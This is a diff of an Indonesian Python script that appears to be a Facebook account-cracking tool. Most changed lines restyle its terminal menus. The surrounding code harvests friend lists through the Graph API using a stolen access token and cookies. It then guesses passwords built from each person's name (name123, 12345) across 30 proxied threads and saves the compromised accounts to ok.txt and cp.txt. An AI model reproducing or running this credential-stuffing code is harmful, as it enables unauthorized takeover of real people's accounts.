@@ -46,7 +46,7 @@ def hapus():
 	
 def login():
 	bersih_layar()
-	print(f"{B}╭────────────────────────────────────────────────────")
+	print(f"{B}╭───────────────────────────────────────────────────────")
 	print(f"{B}│ {M}╭────────────────────────────────────────────────────╮")
 	print(f"{B}│ {M}│{K} ▄▄▄ .▐▄• ▄ ▄▄▄▄▄▄▄▄   ▄▄▄·  ▐▄▄▄      .▄▄ · .▄▄ ·  {M}│")
 	print(f"{B}│ {M}│{K} ▀▄.▀· █▌█▌▪•██  ▀▄ █·▐█ ▀█   ·██▪     ▐█ ▀. ▐█ ▀.  {M}│")
@@ -75,7 +75,7 @@ def menu():
 		hapus()
 		login()
 	bersih_layar()
-	print(f"{J}╭────────────────────────────────────────────────────")
+	print(f"{J}╭───────────────────────────────────────────────────────")
 	print(f"{J}│ {U}╭────────────────────────────────────────────────────╮")
 	print(f"{J}│ {U}│{H} ▄▄▄ .▐▄• ▄ ▄▄▄▄▄▄▄▄   ▄▄▄·  ▐▄▄▄      .▄▄ · .▄▄ ·  {U}│")
 	print(f"{J}│ {U}│{H} ▀▄.▀· █▌█▌▪•██  ▀▄ █·▐█ ▀█   ·██▪     ▐█ ▀. ▐█ ▀.  {U}│")
@@ -86,6 +86,7 @@ def menu():
 	print(f"{J}├───[{H}×{J}]{U} Nama	   : {nama}")
 	print(f"{J}├───[{H}×{J}]{U} ID         : {user}")
 	print(f"{J}├───[{H}×{J}]{U} Tgl. Lahir : {ttl}")
+	print(f"{J}├───────────────────────────────────────────────────────")
 	print(f"{J}├───[{H}1{J}]{U} Crack Teman/Publik")
 	print(f"{J}├───[{H}2{J}]{U} Lihat Akun Hasil Crack")
 	print(f"{J}├───[{H}3{J}]{U} Logout (Hapus Login)")
@@ -94,30 +95,30 @@ def menu():
 	if ask in["1"]:
 		publik(token,cookie)
 	elif ask in["2"]:
-		print("\n [1] lihat akun hasil crack ok")
-		print(" [2] lihat akun hasil crack cp")
-		hasil = input("\n [?] pilih : ")
+		print(f"{J}├───[{H}1{J}]{U} Lihat Akun Hasil Crack Ok")
+		print(f"{J}├───[{H}2{J}]{U} Lihat Akun Hasil Crack Cp")
+		hasil = input(f"{J}├───[{H}3{J}]{U} Pilih : ")
 		if hasil in["1"]:
 			try:hasilok = open("ok.txt").read().splitlines()
-			except:exit(f" [!] tidak ada file ok, silahkan crack dulu")
-			print(" [#] ----------------------------------------------")
-			print(f" [+] total akun hasil crack ok : {len(hasilok)}")
-			print(f" [#] ----------------------------------------------{H}")
+			except:exit(f"{J}├───[{H}+{J}]{U} Tidak Ada File Ok, Silahkan Crack Dulu")
+			print(f"{J}├───────────────────────────────────────────────────────")
+			print(f"{J}├───[{H}+{J}]{U} Total Akun Hasil Crack Ok : {len(hasilok)}")
+			print(f"{J}├───────────────────────────────────────────────────────")
 			os.system("cat ok.txt")
 			exit(f"\n\n {N}[#] selesai cek ...")
 		elif hasil in["2"]:
 			try:hasilcp = open("ok.txt").read().splitlines()
-			except:exit(f" [!] tidak ada file cp, silahkan crack dulu")
-			print(" [#] ----------------------------------------------")
-			print(f" [+] total akun hasil crack ok : {len(hasilcp)}")
-			print(f" [#] ----------------------------------------------{K}")
+			except:exit(f"├───[!] Tidak Ada File Cp, Silahkan Crack Dulu")
+			print(f"{J}├───────────────────────────────────────────────────────")
+			print(f"{J}├───[{H}+{J}]{U} Total Akun Hasil Crack Ok : {len(hasilcp)}")
+			print(f"{J}├───────────────────────────────────────────────────────")
 			os.system("cat cp.txt")
 			exit(f"\n\n {N}[#] selesai cek ...")
 		else:menu()
 	elif ask in["3"]:
 		hapus()
 		print(f"{J}├───────────────────────────────────────────────────────")
-		exit(" [✓] berhasil menghapus token ")
+		exit(f"{J}├───[{H}✓{J}]{U} Berhasil Menghapus Token ")
 	else:menu() 
 
 def publik(token,cookie):
@@ -135,26 +136,26 @@ def publik(token,cookie):
 			for i in ses.get(f"https://graph.facebook.com/{idt}?fields=name,friends.fields(id,name).limit(5000)&access_token={token}",cookies=cookie).json()["friends"]["data"]:
 				id.append(i["id"]+"<=>"+i["name"])
 		except KeyError:
-			exit(" [!] akun tidak tersedia atau list teman private")
+			exit("├───[!] Akun Tidak Tersedia Atau List Teman Private")
 	elif ask in["2"]:
 		try:
 			for i in ses.get(f"https://graph.facebook.com/{idt}?fields=name,friends.fields(id,name).limit(5000)&access_token={token}",cookies=cookie).json()["friends"]["data"]:
 				if i["id"][:5] in ["10008"] or i["id"][:5] in ["10007"]:
 					id.append(i["id"]+"<=>"+i["name"])
 		except KeyError:
-			exit(" [!] akun tidak tersedia atau list teman private")
+			exit("├───[!] Akun Tidak Tersedia Atau List Teman Private")
 	elif ask in["3"]:
 		try:
 			for i in ses.get(f"https://graph.facebook.com/{idt}?fields=name,friends.fields(id,name).limit(5000)&access_token={token}",cookies=cookie).json()["friends"]["data"]:
 				if len(i["id"])==7 or len(i["id"])==8 or len(i["id"])==9 or len(i["id"])==10:
 					id.append(i["id"]+"<=>"+i["name"])
 		except KeyError:
-			exit(" [!] akun tidak tersedia atau list teman private")
+			exit("├───[!] Akun Tidak Tersedia Atau List Teman Private")
 	atursandi()
 		
 def atursandi():
 	print(f"{J}├───────────────────────────────────────────────────────")
-	print(f" [+] total id terkumpul : {len(id)}")
+	print(f"{J}├───[{H}+{J}]{U} Total Id Terkumpul : {len(id)}")
 	print(f"{J}├───────────────────────────────────────────────────────")
 	print(f"{J}├───[{H}1{J}]{U} Otomatis\n{J}├───[{H}2{J}]{U} Manual\n{J}├───[{H}3{J}]{U} Gabungkan\n{J}├──╭[{H}METODE{J}]────────────────────────────────────────────")
 	ask=input(f"{J}│  ╰──{U}➣{H} ")
@@ -176,7 +177,7 @@ def otomatis():
 	print(f"{J}├──╭[{H}METODE{J}]────────────────────────────────────────────")
 	ask=input(f"{J}│  ╰──{U}➣{H} ")
 	if ask=="":
-		exit(" %s[!] isi jawaban dengan benar!"%(M))
+		exit("%s├───[!] Isi Jawaban Dengan Benar!"%(M))
 	elif ask=="1":
 		print(f"{J}├───[{H}+{J}]{U} Hasil OK Disimpan Ke -> ok.txt")
 		print(f"{J}├───[{H}+{J}]{M} Hasil CP Disimpan Ke -> cp.txt")
@@ -190,11 +191,11 @@ def otomatis():
 				else:
 					pwx = [name, nam[0]+"123", nam[0]+"12345"]
 				fall.submit(api, user, pwx)
-		exit("\n\n [#] crack selesai...")
+		exit("\n\n [#] Crack Selesai...")
 	elif ask=="2":
-		print(" [+] hasil OK disimpan ke -> ok.txt")
-		print(" [+] hasil CP disimpan ke -> cp.txt")
-		print("──────────────────────────────────────────")
+		print(f"{J}├───[{H}+{J}]{U} Hasil OK Disimpan Ke -> ok.txt")
+		print(f"{J}├───[{H}+{J}]{M} Hasil CP Disimpan Ke -> cp.txt")
+		print(f"{J}├───────────────────────────────────────────────────────")
 		with ThreadPoolExecutor(max_workers=30) as fall:
 			for user in id:
 				user, name = user.split("<=>")
@@ -204,37 +205,37 @@ def otomatis():
 				else:
 					pwx = [name, nam[0]+"123", nam[0]+"12345"]
 				fall.submit(crack, user, pwx)
-		exit("\n\n [#] crack selesai...")
+		exit("\n\n [#] Crack Selesai...")
 		
 
 def manual():
-	print("──────────────────────────────────────────")
-	print(" [!] gunakan , (koma) sebagai pemisah")
-	pwek=input(" [?] buat kata sandi : ")
+	print(f"{J}├───────────────────────────────────────────────────────")
+	print(f"{J}├───[{H}+{J}]{U} Gunakan , (koma) Sebagai Pemisah")
+	pwek=input(f"{J}├───[{H}+{J}]{U} Buat Kata Sandi : ")
 	if pwek=="":
-		exit(" %s[!] isi jawaban dengan benar!"%(M))
+		exit("%s├───[!] Isi Jawaban Dengan Benar!"%(M))
 	elif len(pwek)<=5:
-		exit(" %s[!] masukan sandi minimal 6 angka!"%(M))
-	print("──────────────────────────────────────────")
-	print(" [1]. metode API")
-	print(" [2]. method mobile")
-	print("──────────────────────────────────────────")
-	ask=input(" [?] pilih : ")
+		exit("%s├───[!] Masukan Sandi Minimal 6 Angka!"%(M))
+	print(f"{J}├───────────────────────────────────────────────────────")
+	print(f"{J}├───[{H}1{J}]{U} metode API")
+	print(f"{J}├───[{H}2{J}]{U} metode mobile")
+	print(f"{J}├──╭[{H}METODE{J}]────────────────────────────────────────────")
+	ask=input(f"{J}│  ╰──{U}➣{H} ")
 	if ask=="":
-		exit(" %s[!] isi jawaban dengan benar!"%(M))
+		exit("%s├───[!] isi jawaban dengan benar!"%(M))
 	elif ask=="1":
-		print(" [+] hasil OK disimpan ke -> ok.txt")
-		print(" [+] hasil CP disimpan ke -> cp.txt")
-		print("──────────────────────────────────────────")
+		print(f"{J}├───[{H}+{J}]{U} Hasil OK Disimpan Ke -> ok.txt")
+		print(f"{J}├───[{H}+{J}]{M} Hasil CP Disimpan Ke -> cp.txt")
+		print(f"{J}├───────────────────────────────────────────────────────")
 		with ThreadPoolExecutor(max_workers=30) as fall:
 			for user in id:
 				user, name = user.split("<=>")
 				fall.submit(api, user, pwek.split(","))
 		exit("\n\n [#] crack selesai...")
 	elif ask=="2":
-		print(" [+] hasil OK disimpan ke -> ok.txt")
-		print(" [+] hasil CP disimpan ke -> cp.txt")
-		print("──────────────────────────────────────────")
+		print(f"{J}├───[{H}+{J}]{U} Hasil OK Disimpan Ke -> ok.txt")
+		print(f"{J}├───[{H}+{J}]{M} Hasil CP Disimpan Ke -> cp.txt")
+		print(f"{J}├───────────────────────────────────────────────────────")
 		with ThreadPoolExecutor(max_workers=30) as fall:
 			for user in id:
 				user, name = user.split("<=>")
@@ -243,25 +244,25 @@ def manual():
 		
 
 def gabungkan():
-	print("──────────────────────────────────────────")
-	print(" [!] sandi bawaan nama123,1234,12345")
-	print(" [!] gunakan , (koma) sebagai pemisah")
-	pwek=input(" [?] sandi gabungan : ")
+	print(f"{J}├───────────────────────────────────────────────────────")
+	print(f"{J}├───[{H}+{J}]{U} Sandi Bawaan Nama123,1234,12345")
+	print(f"{J}├───[{H}+{J}]{U} Gunakan , (koma) Sebagai Pemisah")
+	pwek=input(f"{J}├───[{H}+{J}]{U} Sandi Gabungan : ")
 	if pwek=="":
-		exit(" %s[!] isi jawaban dengan benar!"%(M))
+		exit("%s├───[!] isi jawaban dengan benar!"%(M))
 	elif len(pwek)<=5:
-		exit(" %s[!] masukan sandi minimal 6 angka!"%(M))
-	print("──────────────────────────────────────────")
-	print(" [1]. method API")
-	print(" [2]. method mobile")
-	print("──────────────────────────────────────────")
-	ask=input(" [?] pilih : ")
+		exit("%s├───[!] Masukan Sandi Minimal 6 Angka!"%(M))
+	print(f"{J}├───────────────────────────────────────────────────────")
+	print(f"{J}├───[{H}1{J}]{U} metode API")
+	print(f"{J}├───[{H}2{J}]{U} metode mobile")
+	print(f"{J}├──╭[{H}METODE{J}]────────────────────────────────────────────")
+	ask=input(f"{J}│  ╰──{U}➣{H} ")
 	if ask=="":
-		exit(" %s[!] isi jawaban dengan benar!"%(M))
+		exit("%s├───[!] Isi Jawaban Dengan Benar!"%(M))
 	elif ask=="1":
-		print(" [+] hasil OK disimpan ke -> ok.txt")
-		print(" [+] hasil CP disimpan ke -> cp.txt")
-		print("──────────────────────────────────────────")
+		print(f"{J}├───[{H}+{J}]{U} Hasil OK Disimpan Ke -> ok.txt")
+		print(f"{J}├───[{H}+{J}]{M} Hasil CP Disimpan Ke -> cp.txt")
+		print(f"{J}├───────────────────────────────────────────────────────")
 		with ThreadPoolExecutor(max_workers=30) as fall:
 			for user in id:
 				user, name = user.split("<=>")
@@ -273,9 +274,9 @@ def gabungkan():
 				fall.submit(api, user, pwx)
 		exit("\n\n [#] crack selesai...")
 	elif ask=="2":
-		print(" [+] hasil OK disimpan ke -> ok.txt")
-		print(" [+] hasil CP disimpan ke -> cp.txt")
-		print("──────────────────────────────────────────")
+		print(f"{J}├───[{H}+{J}]{U} Hasil OK Disimpan Ke -> ok.txt")
+		print(f"{J}├───[{H}+{J}]{M} Hasil CP Disimpan Ke -> cp.txt")
+		print(f"{J}├───────────────────────────────────────────────────────")
 		with ThreadPoolExecutor(max_workers=30) as fall:
 			for user in id:
 				user, name = user.split("<=>")
@@ -287,11 +288,11 @@ def gabungkan():
 				fall.submit(crack, user, pwx)
 		exit("\n\n [#] crack selesai...")
 	
-
+#----------------[ METODE API ]----------------#
 def api(user, pwx):
 	global ok, cp, loop, token
 	prox = open("proxy.txt","r").read().splitlines()
-	sys.stdout.write(f"\r {N}[+] [crack] {loop}/{len(id)}  OK : {len(ok)} - CP : {len(cp)} "); sys.stdout.flush()
+	sys.stdout.write(f"\r{N}└───[{B}ChangFB{N}][{B}{loop}/{len(id)}{N}]-[{H}OK : {len(ok)}{N}]-[{M}CP : {len(cp)}{N}] "); sys.stdout.flush()
 	try:
 		for pw in pwx:
 			pw = pw.lower()
@@ -365,7 +366,7 @@ def api(user, pwx):
 					print("tidak ada opsi atau mungkin tap yes")
 				else:
 					z = 0
-					print(f" [+] terdeteksi {len(option)} opsi :")
+					print(f" [+] Terdeteksi {len(option)} opsi :")
 					for opsi in option:
 						z+=1
 						print(f"  [{z}]. {opsi.text}")
@@ -376,13 +377,13 @@ def api(user, pwx):
 	except Exception as e:
 		time.sleep(32)
 
-
+#----------------[ MOBILE ]----------------#
 def crack(user, pwx):
 	global ok, cp, loop, token
 	prox = open("proxy.txt","r").read().splitlines()
 	ua1 = random.choice(ugent1)
 	ua2 = random.choice(ugent2)
-	sys.stdout.write(f"\r {N}[+] [crack] {loop}/{len(id)}  OK : {len(ok)} - CP : {len(cp)} "); sys.stdout.flush()
+	sys.stdout.write(f"\r{N}└───[{B}ChangFB{N}][{B}{loop}/{len(id)}{N}]-[{H}OK : {len(ok)}{N}]-[{M}CP : {len(cp)}{N}] "); sys.stdout.flush()
 	try:
 		for pw in pwx:
 			dat = {}
